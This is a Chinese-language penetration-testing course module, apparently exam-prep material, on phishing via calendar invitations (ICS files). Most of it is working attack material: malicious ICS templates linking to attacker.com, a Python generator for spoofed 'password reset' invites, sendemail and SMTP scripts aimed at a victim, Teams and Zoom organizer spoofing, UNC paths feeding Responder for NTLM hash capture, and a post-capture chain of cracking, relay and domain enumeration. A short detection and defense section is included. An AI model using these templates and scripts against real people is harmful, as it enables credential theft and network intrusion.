# Module 03: Office 宏攻击

## 第九节：日历钓鱼攻击 (Calendar Phishing)

### 写在前面

如果你是 Web 安全背景，可以这样理解：
- **日历钓鱼** 类似于利用 HTML 邮件中的恶意链接
- 利用 ICS 文件格式绕过传统邮件过滤
- 通过日历邀请诱导用户点击恶意链接
- 是社会工程学攻击的高级形式

---

## 一、为什么使用日历钓鱼？

### 1.1 传统钓鱼的局限

```
传统邮件钓鱼的问题：
┌─────────────────────────────────────────────────────────┐
│ 1. 邮件网关会扫描附件和链接                             │
│ 2. 用户对可疑邮件警惕性提高                             │
│ 3. 恶意附件容易被检测                                   │
│ 4. 链接可能被沙箱分析                                   │
└─────────────────────────────────────────────────────────┘
```

### 1.2 日历钓鱼的优势

```
日历钓鱼的优势：
┌─────────────────────────────────────────────────────────┐
│ 1. ICS 文件通常不被邮件过滤器重点检查                   │
│ 2. 日历邀请看起来更加正式和可信                         │
│ 3. 用户习惯于接受会议邀请                               │
│ 4. 可以利用日历提醒功能增加曝光                         │
│ 5. 支持嵌入链接和描述信息                               │
└─────────────────────────────────────────────────────────┘
```

## 二、ICS 文件格式详解

### 2.1 什么是 ICS？

ICS (iCalendar) 是一种通用的日历数据交换格式：
- 由 IETF 在 RFC 5545 中定义
- 被 Google Calendar、Outlook、Apple Calendar 等广泛支持
- 纯文本格式，易于创建和修改

### 2.2 ICS 文件结构

```
BEGIN:VCALENDAR                    ← 日历开始
PRODID:Microsoft Exchange Server   ← 产品标识
VERSION:2.0                        ← 版本
CALSCALE:GREGORIAN                 ← 日历类型
METHOD:REQUEST                     ← 方法（REQUEST=邀请）

BEGIN:VTIMEZONE                    ← 时区定义开始
TZID:UTC                           ← 时区ID
BEGIN:STANDARD
DTSTART:20241010T073659Z
TZOFFSETFROM:+0000
TZOFFSETTO:+0000
END:STANDARD
END:VTIMEZONE                      ← 时区定义结束

BEGIN:VEVENT                       ← 事件开始
DTSTART;TZID=UTC:20241010T073059Z  ← 开始时间
DTEND;TZID=UTC:20241010T083059Z    ← 结束时间
DTSTAMP:20241010T034159Z           ← 时间戳
ORGANIZER;CN=Peter:mailto:peter@corp1.com  ← 组织者
UID:FIXMEUID20241010T034159Z       ← 唯一标识
CREATED:20241010T034159Z           ← 创建时间
DESCRIPTION:http://meeting.corp1.com  ← 描述（可放链接）
LAST-MODIFIED:20241010T034159Z     ← 最后修改
LOCATION:Microsoft Teams Meeting   ← 地点
SEQUENCE:0                         ← 序列号
STATUS:CONFIRMED                   ← 状态
SUMMARY:HR meeting                 ← 标题
TRANSP:OPAQUE                      ← 透明度
END:VEVENT                         ← 事件结束

END:VCALENDAR                      ← 日历结束
```

### 2.3 关键字段说明

| 字段 | 说明 | 攻击利用 |
|------|------|----------|
| ORGANIZER | 组织者信息 | 可伪造为可信来源 |
| SUMMARY | 会议标题 | 使用诱人的标题 |
| DESCRIPTION | 详细描述 | 嵌入恶意链接 |
| LOCATION | 会议地点 | 可放置恶意 URL |
| DTSTART/DTEND | 时间 | 设置紧急时间增加紧迫感 |
| UID | 唯一标识 | 每次发送需要唯一 |

## 三、创建恶意日历邀请

### 3.1 基础模板

```
BEGIN:VCALENDAR
PRODID:Microsoft Exchange Server 2022
VERSION:2.0
CALSCALE:GREGORIAN
METHOD:REQUEST
BEGIN:VTIMEZONE
TZID:UTC
BEGIN:STANDARD
DTSTART:20241010T073659Z
TZOFFSETFROM:+0000
TZOFFSETTO:+0000
END:STANDARD
END:VTIMEZONE
BEGIN:VEVENT
DTSTART;TZID=UTC:20241010T073059Z
DTEND;TZID=UTC:20241010T083059Z
DTSTAMP:20241010T034159Z
ORGANIZER;CN=HR Department:mailto:hr@company.com
UID:UNIQUE-ID-12345-67890
CREATED:20241010T034159Z
DESCRIPTION:Please join our mandatory HR meeting.\n\nMeeting Link: http://attacker.com/meeting
LAST-MODIFIED:20241010T034159Z
LOCATION:Online Meeting
SEQUENCE:0
STATUS:CONFIRMED
SUMMARY:Mandatory: Annual Benefits Review
TRANSP:OPAQUE
END:VEVENT
END:VCALENDAR
```

### 3.2 Python 生成脚本

```python
#!/usr/bin/env python3
"""
ICS 日历钓鱼文件生成器
用于安全测试和渗透测试
"""

from datetime import datetime, timedelta
import uuid

def generate_ics(
    organizer_name: str,
    organizer_email: str,
    summary: str,
    description: str,
    location: str,
    start_time: datetime = None,
    duration_hours: int = 1
) -> str:
    """生成 ICS 日历文件内容"""

    if start_time is None:
        start_time = datetime.utcnow() + timedelta(days=1)

    end_time = start_time + timedelta(hours=duration_hours)
    timestamp = datetime.utcnow()

    # 格式化时间
    fmt = "%Y%m%dT%H%M%SZ"
    dtstart = start_time.strftime(fmt)
    dtend = end_time.strftime(fmt)
    dtstamp = timestamp.strftime(fmt)

    # 生成唯一 ID
    uid = f"{uuid.uuid4()}@calendar"

    ics_content = f"""BEGIN:VCALENDAR
PRODID:Microsoft Exchange Server 2022
VERSION:2.0
CALSCALE:GREGORIAN
METHOD:REQUEST
BEGIN:VTIMEZONE
TZID:UTC
BEGIN:STANDARD
DTSTART:{dtstamp}
TZOFFSETFROM:+0000
TZOFFSETTO:+0000
END:STANDARD
END:VTIMEZONE
BEGIN:VEVENT
DTSTART;TZID=UTC:{dtstart}
DTEND;TZID=UTC:{dtend}
DTSTAMP:{dtstamp}
ORGANIZER;CN={organizer_name}:mailto:{organizer_email}
UID:{uid}
CREATED:{dtstamp}
DESCRIPTION:{description}
LAST-MODIFIED:{dtstamp}
LOCATION:{location}
SEQUENCE:0
STATUS:CONFIRMED
SUMMARY:{summary}
TRANSP:OPAQUE
END:VEVENT
END:VCALENDAR"""

    return ics_content

# 使用示例
if __name__ == "__main__":
    ics = generate_ics(
        organizer_name="IT Security Team",
        organizer_email="security@company.com",
        summary="Urgent: Password Reset Required",
        description="Your password will expire soon.\\n\\nPlease reset at: http://attacker.com/reset",
        location="Online Portal"
    )

    with open("meeting.ics", "w") as f:
        f.write(ics)

    print("[+] ICS file generated: meeting.ics")
```

## 四、发送日历邀请

### 4.1 使用 sendemail 发送

```bash
# 安装 sendemail
sudo apt install sendemail

# 发送带 ICS 附件的邮件
sendemail -f "hr@company.com" \
    -t "victim@target.com" \
    -u "Meeting Invitation: Annual Review" \
    -m "Please find the meeting invitation attached." \
    -a meeting.ics \
    -s smtp.server.com:25 \
    -o tls=no
```

### 4.2 使用 Python 发送

```python
#!/usr/bin/env python3
"""
发送日历钓鱼邮件
"""

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

def send_calendar_invite(
    smtp_server: str,
    smtp_port: int,
    from_email: str,
    to_email: str,
    subject: str,
    body: str,
    ics_file: str
):
    """发送带 ICS 附件的邮件"""

    # 创建邮件
    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject

    # 添加正文
    msg.attach(MIMEText(body, 'plain'))

    # 添加 ICS 附件
    with open(ics_file, 'rb') as f:
        attachment = MIMEBase('text', 'calendar', method='REQUEST')
        attachment.set_payload(f.read())
        encoders.encode_base64(attachment)
        attachment.add_header(
            'Content-Disposition',
            f'attachment; filename="{ics_file}"'
        )
        msg.attach(attachment)

    # 发送邮件
    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.sendmail(from_email, to_email, msg.as_string())

    print(f"[+] Email sent to {to_email}")

# 使用示例
if __name__ == "__main__":
    send_calendar_invite(
        smtp_server="smtp.server.com",
        smtp_port=25,
        from_email="hr@company.com",
        to_email="victim@target.com",
        subject="Meeting Invitation: Annual Benefits Review",
        body="Please accept the attached meeting invitation.",
        ics_file="meeting.ics"
    )
```

## 五、高级技巧

### 5.1 利用 Responder 窃取凭据

结合 Responder 工具，可以通过日历邀请窃取 NTLM 哈希：

```bash
# 1. 启动 Responder
sudo responder -I eth0 -wrf

# 2. 在 ICS 文件中使用 UNC 路径
# DESCRIPTION:Please access the shared folder: \\\\attacker-ip\\share
```

ICS 文件示例：
```
BEGIN:VEVENT
...
DESCRIPTION:Meeting documents available at: \\\\192.168.1.100\\meeting-docs
...
END:VEVENT
```

当用户打开日历邀请并点击链接时，Windows 会尝试进行 NTLM 认证，Responder 可以捕获哈希。

### 5.2 伪造可信来源

```
# 伪造为 Microsoft Teams
ORGANIZER;CN=Microsoft Teams:mailto:noreply@teams.microsoft.com
SUMMARY:You have been invited to a Teams meeting
LOCATION:Microsoft Teams Meeting

# 伪造为 Zoom
ORGANIZER;CN=Zoom:mailto:no-reply@zoom.us
SUMMARY:Zoom Meeting Invitation
LOCATION:https://zoom.us/j/123456789
```

### 5.3 添加紧迫感

```
# 使用紧急标题
SUMMARY:URGENT: Mandatory Security Training - Today
SUMMARY:ACTION REQUIRED: Password Expiration Notice
SUMMARY:Important: Benefits Enrollment Deadline

# 设置即将到来的时间
DTSTART;TZID=UTC:20241010T140000Z  # 今天下午
```

## 六、防御与检测

### 6.1 检测指标

| 指标 | 说明 |
|------|------|
| 外部 ICS 附件 | 来自外部的日历邀请 |
| 可疑链接 | 描述中包含非公司域名链接 |
| UNC 路径 | 包含 \\\\ 开头的路径 |
| 伪造发件人 | ORGANIZER 与实际发件人不匹配 |
| 紧急标题 | 包含 URGENT、ACTION REQUIRED 等 |

### 6.2 防御措施

1. **邮件网关配置**
   - 扫描 ICS 附件中的链接
   - 检测 UNC 路径
   - 验证 ORGANIZER 字段

2. **用户培训**
   - 警惕来自外部的日历邀请
   - 不要点击可疑链接
   - 验证会议组织者身份

3. **技术控制**
   - 禁用自动接受外部日历邀请
   - 阻止 SMB 出站流量
   - 使用 Web 代理检查链接

## 七、实战场景

### 7.1 场景一：凭据窃取

```
攻击流程：
1. 创建包含恶意链接的 ICS 文件
2. 链接指向伪造的登录页面
3. 发送给目标用户
4. 用户点击链接并输入凭据
5. 攻击者获取凭据
```

### 7.2 场景二：NTLM 哈希捕获

```
攻击流程：
1. 启动 Responder
2. 创建包含 UNC 路径的 ICS 文件
3. 发送给目标用户
4. 用户打开邀请，系统尝试访问 UNC 路径
5. Responder 捕获 NTLM 哈希
6. 使用 hashcat 破解或进行 Pass-the-Hash
```

### 7.3 场景三：恶意软件投递

```
攻击流程：
1. 创建 ICS 文件，链接指向恶意文档
2. 发送给目标用户
3. 用户点击链接下载文档
4. 用户打开文档并启用宏
5. 恶意代码执行
```

## ICS 字段检查清单

日历钓鱼不要只看“有没有链接”，要逐字段确认客户端会如何展示和触发。

| 字段 | 检查点 | 考试用途 |
|---|---|---|
| `BEGIN:VEVENT` / `END:VEVENT` | 事件边界是否完整 | 防止客户端直接丢弃邀请 |
| `UID` | 是否唯一且格式正常 | 避免被当作重复事件 |
| `ORGANIZER` | 显示名、邮箱域名、可信度 | 影响用户是否打开或点击 |
| `SUMMARY` | 标题是否像真实业务 | 提高打开概率 |
| `DESCRIPTION` | 链接、UNC、说明文本是否清晰 | 放置凭证捕获或下载入口 |
| `LOCATION` | 是否支持 URL/UNC/会议链接 | 部分客户端会高亮或自动处理 |
| `ATTACH` | 附件/远程资源是否被客户端加载 | 触发访问或投递文档 |
| `DTSTART` / `DTEND` | 时间是否合理、时区是否正确 | 避免明显异常 |
| `VALARM` | 提醒是否会二次显示内容 | 增加触达机会 |

不同客户端对 `DESCRIPTION`、`LOCATION`、`ATTACH` 的处理差异很大，实验时要记录 Outlook、Webmail、移动端是否会自动访问远程资源。

## Responder 捕获后的处理链

| 阶段 | 动作 | 下一步判断 |
|---|---|---|
| 保存 Hash | 保留 Responder 原始输出和时间戳 | 证明认证来源 |
| 识别身份 | 看域名、用户名、来源 IP | 判断是否高价值用户或机器账户 |
| 尝试破解 | 用合适字典和规则跑 NTLMv2 | 破解成功转明文登录验证 |
| 无法破解 | 评估 SMB/LDAP/HTTP Relay | 看签名、EPA、目标服务 |
| 验证访问 | SMB、MSSQL、WinRM、RDP 或 Web 登录 | 记录凭证能访问哪里 |
| 进入域枚举 | BloodHound、ADCS、Kerberoast、MSSQL | 不要停在“捕获成功” |

考试可用总结：日历钓鱼更像凭证入口。最终价值取决于捕获身份能否破解、中继或转成域枚举起点。

## 九、总结

### 9.1 关键点

1. **ICS 是有效的钓鱼载体**：通常不被重点检查
2. **可以嵌入恶意链接**：在描述和位置字段中
3. **支持 UNC 路径**：可用于 NTLM 哈希捕获
4. **社会工程学**：利用紧迫感和可信来源

### 9.2 MITRE ATT&CK 映射

|------|-----|------|
| Phishing | T1566 | 钓鱼攻击 |
| Spearphishing Attachment | T1566.001 | 带附件的定向钓鱼 |
| Forced Authentication | T1187 | 强制认证（NTLM 捕获） |
